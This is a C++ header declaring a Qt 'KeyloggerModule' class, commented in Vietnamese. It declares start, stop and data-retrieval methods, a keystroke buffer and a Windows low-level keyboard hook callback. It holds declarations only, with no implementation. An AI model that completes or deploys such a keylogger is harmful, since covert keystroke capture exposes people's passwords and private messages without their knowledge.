#ifndef KEYLOGGERMODULE_H
#define KEYLOGGERMODULE_H

#include <QObject>
#include <QString>
#include <QStringList>
#include <QMutex>

class KeyloggerModule : public QObject
{
    Q_OBJECT

public:
    explicit KeyloggerModule(QObject *parent = nullptr);
    ~KeyloggerModule();

    // Bắt đầu ghi phím
    QString startKeylogger();

    // Dừng ghi phím
    QString stopKeylogger();

    // Lấy dữ liệu đã ghi
    QString getKeyloggerData();

    // Kiểm tra trạng thái
    bool isRunning() const;

private:
    bool running;
    QStringList keyBuffer;
    QMutex mutex;

#ifdef Q_OS_WIN
    // Windows keyboard hook
    static KeyloggerModule* instance;
    static void* hookHandle;   // HHOOK
    static long __stdcall keyboardProc(int nCode, unsigned long long wParam, long long lParam);
#endif
};

#endif // KEYLOGGERMODULE_H
